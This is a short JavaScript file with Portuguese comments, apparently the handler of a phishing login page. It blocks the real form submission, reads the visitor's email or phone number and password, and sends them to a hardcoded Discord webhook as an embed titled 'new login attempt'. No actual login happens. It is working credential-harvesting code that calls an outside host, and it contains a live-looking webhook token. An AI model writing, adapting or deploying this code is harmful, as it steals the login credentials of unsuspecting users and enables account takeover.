document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Evitar o envio padrão do formulário

    const emailOrPhone = document.getElementById('emailOrPhone').value;
    const password = document.getElementById('password').value;

    // Substitua pelo seu webhook do Discord
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1345442899671912508/f2Jxfx-QdftKjxsnHJPsM7g4HkEs8D0l2d9HN7p73b40PrZLT07DFRS5I04J5lRE30DE';

    // Dados que você quer enviar para o webhook
    const embedData = {
        "embeds": [
            {
                "title": "Nova tentativa de login:",
                "color": 16711680, // Cor vermelha (você pode personalizar a cor)
                "fields": [
                    {
                        "name": "Email/Telefone:",
                        "value": emailOrPhone
                    },
                    {
                        "name": "Senha:",
                        "value": `||${password}||` // O uso de '||' faz o conteúdo da senha ficar oculto
                    }
                ]
            }
        ]
    };

    // Enviar os dados para o webhook do Discord
    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embedData)
    })
    .then(response => {
        if (response.ok) {
            console.log('Dados enviados para o Discord com sucesso!');
        } else {
            console.error('Erro ao enviar os dados para o Discord');
        }
    })
    .catch(error => {
        console.error('Erro de rede:', error);
    });
});
